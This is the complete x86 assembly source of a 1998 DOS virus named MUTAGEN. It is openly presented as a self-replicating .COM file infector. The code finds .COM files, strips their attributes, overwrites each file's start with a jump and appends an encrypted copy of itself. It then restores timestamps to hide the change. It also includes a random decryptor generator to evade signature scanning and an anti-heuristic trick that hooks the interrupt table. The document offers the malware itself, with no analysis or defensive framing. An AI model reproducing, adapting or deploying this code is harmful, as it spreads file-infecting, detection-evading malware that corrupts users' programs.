;------------------------------------------------------------------
;	      MUTAGEN v1.0 (c) 1998 by B!Z0n //[BzZ]
;      Non overwriting mutatton search .COM infector with
;		       antiheuristic trick
;		  BzZ Random Code Generator based
;------------------------------------------------------------------
.MODEL TINY
.CODE
.386
;------------------------------------------------------------------
MajorVer = 1
MinorVer = 0
;------------------------------------------------------------------
diffr = offset next - offset exit
crnxt = offset crypted - offset next
decr  = decrlen - start
;------------------------------------------------------------------

		ORG 100h

MAIN:		db  0E9h,00h,00h

START_VIRUS	PROC NEAR
;==================================================================
start:	mov	ax, 0055h					  ;
	mov	es, ax						  ;
	xor	di, di						  ;
	push	ax di		;------------------------	  ;
	mov	eax, 5545455Dh	;0055:0000  5D	pop	bp	  ;
	stosd			;	    45	inc	bp	  ;
	mov	al, 0CFh	;	    45	inc	bp	  ;
	stosb			;	    55	push	bp	  ;
	pop	eax		;	    CF	iret		  ;
	xor	bx, bx		;------------------------	  ;
	mov	es, bx						  ;
	xchg	eax, dword ptr es:[bx]				  ;
	div	bx
exit:
	add	bp, diffr
	mov	di, bp
	db	081h, 0C7h
decrlen dw	00000h
	push	di
	add	di, crnxt
	mov	cx, End_Virus-crypted
;---------------
next:
;---------------
	inc	di
	dec	cx
	jz	crypted
	jmp	bp
crypted:
	sub	bp, offset next
	xchg	eax, dword ptr es:[bx]				  ;
	pop	di
;------------------------------------------------------------------
	push	cs						  ;
	pop	es						  ;
;==================================================================
	add	bp, word ptr [bp+decrlen]

	mov	dx, word ptr ds:[MAIN+1]
	add	dx, offset start
	mov	word ptr [headstart+ bp], dx
	mov	word ptr [@@AA +bp], di

	lea	si,[bp+ORIG_START]
	mov	di,100h
	push	di
	cld
	movsw
	movsb
	lea	dx,[bp+NEW_DTA]
	mov	ah,1ah
	int	21h
FINDFIRST:
	mov	ah,4eh
	lea	dx,[bp+COM_MASK]
	xor	cx,cx
FINDNEXT:
	int	21h
	jc	QUIT
	mov	ax,3d02h
	lea	dx,[bp+NEW_DTA+30]
	int	21h
	xchg	ax,bx
CHECK_INFECT:
	mov	ah,3fh
	lea	dx,[bp+ORIG_START]
	mov	cx,3
	int	21h
	cmp	word ptr [bp+ORIG_START], 'ZM'
	je	CloseFile
	cmp	byte ptr [bp+ORIG_START], 0E9h
	jnz	INFECT_COM
CloseFile:
	mov	ah,3eh
	int	21h
	mov	ah,4fh
	jmp	short FINDNEXT
QUIT:
	mov	dx,80h
	mov	ah,1ah
	int	21h
	retn
INFECT_COM:
	mov	ax,4301h
	xor	cx,cx
	lea	dx,[bp+NEW_DTA+30]
	int	21h
	mov	ax,word ptr[bp+NEW_DTA+26]
	sub	ax,3
	mov	word ptr [bp+JMP_OFFSET],ax
	mov	ah,3eh
	int	21h
	mov	ax,3d02h
	int	21h
	xchg	 ax,bx
	mov	ah,40h
	mov	cx,3
	lea	dx,[bp+HEADER]
	int	21h
	mov	al,2
	mov	ah,42h
	xor	cx,cx
	cwd
	int	21h
;==================================================================
Crypting:
	mov	cx, next-start					;
	mov	si, 00000h					;
headstart = $-2
	lea	di, finish +bp					  ;
    rep movsb							  ;
	mov	dx, di
virlen = END_VIRUS-START_VIRUS
vir    = virlen + offset finish
	mov	si, vir+ 160
	add	si, bp
	call	rndcrypt
	push	si
	push	di
	sub	di, dx
	mov	dx, di
	mov	word ptr [decrlen+bp], dx
	pop	di
	mov	word ptr [finish+bp+decr], dx
	mov	cx, End_Virus-next
	mov	si, 0000
@@AA	equ	$-2
    rep movsb
	pop	si
	mov	cx, End_Virus - crypted
	sub	di, cx
@@AB:
	call	si
	cmp	byte ptr [di], 081h
	je	Crypting
	inc	di
	loop	@@AB



;==================================================================
	mov	ah,40h
	mov	cx,END_VIRUS-START_VIRUS
	add	cx, dx
	lea	dx, [bp+finish]
	int	21h
	mov	ax,5701h
	mov	cx,word ptr [bp+NEW_DTA+22]
	mov	dx,word ptr [bp+NEW_DTA+24]
	int	21h
	mov	ax,4301h
	mov	cx,word ptr [bp+NEW_DTA+21]
	lea	dx,[bp+NEW_DTA+30]
	int	21h
	jmp	CloseFile
	
;	 mov	 ah,3eh
;	 int	 21h
	
;	 jmp	 QUIT
;----------------------------------------------------
;-[ BzZ Random Code generator ]----------------------
;----------------------------------------------------
RNDCRYPT:
       mov	byte ptr [si], 0C3h
       in	ax, 40h
       mov	cx, ax
       and	cx, 11111b    ; <=16
       or	cx, 100b      ; >=5
@0:
       call	codegen
       loop	@0
       ret
		db  0,'[BzZ RCG]',0
;-------------------------------------
codegen:
       in	al, 40h
       shr	al, 7
       jne	@1
       call	incdec
       ret
@1:    call	rox
       ret
;-------------------------------------
INCDEC	proc	near
	sub	si, 02h
	in	ax, 40h
	and	ax, 0000110111111110b
	or	ax, 0000010111111110b
	stosw
	xor	ah, 11110111b
	not	ah
	xchg	si, di
	stosw
	xchg	si, di
	sub	si, 02h
	ret
INCDEC	endp
;-------------------------------------
ROX	proc	near
	sub	si, 3
	in	ax, 40h
	and	ax, 0000110111000000b
	or	ax, 0000010111000000b
	stosw
	xor	ah, 11110111b
	not	ah
	xchg	si, di
	stosw
	xchg	si, di
	in	al, 40h
	stosb
	xchg	si, di
	stosb
	xchg	si, di
	sub	si, 3
	ret
ROX	endp
;------------------------------------------------------------------
VirName 	db  0,'[MUTAGEN v'
Ver		db  '0'+ MajorVer
		db  '.'
		db  '0'+ MinorVer
		db  ']'
Copyright	db  0,'[B!Z0n //[BzZ]'
;------------------------------------------------------------------
COM_MASK	db  '*.COM',0
ORIG_START	db  0CDh,20h,0
HEADER		db  0E9h
;------------------------------------------------------------------
START_VIRUS	ENDP
END_VIRUS	equ $
;------------------------------------------------------------------
;------------------------------------------------------------------
JMP_OFFSET	dw  ?
NEW_DTA 	db  43 dup(?)
;------------------------------------------------------------------
finish:
end		  MAIN






